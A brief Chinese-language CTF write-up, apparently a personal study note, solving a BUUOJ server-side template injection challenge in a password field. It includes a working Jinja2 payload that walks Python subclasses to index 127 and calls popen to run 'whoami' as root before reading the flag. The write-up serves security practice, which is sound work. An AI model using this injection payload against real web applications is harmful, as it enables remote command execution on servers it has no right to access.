

## [第三章 web进阶]SSTI

adworld还是崩的，继续拿buuoj的ssti练手吧

![image-20240722233659769](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722233659769.png)

起手一看到password is wrong，那就看有没有文件包含呗

![image-20240722230759310](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722230759310.png)

那就构造ssti：password={{config}}

![image-20240722230845943](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722230845943.png)

经典问题，先看看有没有过滤，这啥也没过滤，有点低级了

![image-20240722231437318](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722231437318.png)

用昨天函数看哪个是os

![image-20240722231823724](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722231823724.png)

127是，构造出

```
password={{%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__.popen("whoami").read()}}
```

看到root权限，枚举出文件进入得到flag

![image-20240722234218663](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722234218663.png)

或者是看到91的get_data函数，抓当前进程：

![image-20240722233429487](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722233429487.png)

一抓就出来了

![image-20240722233504514](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240722233504514.png)

很easy的一题

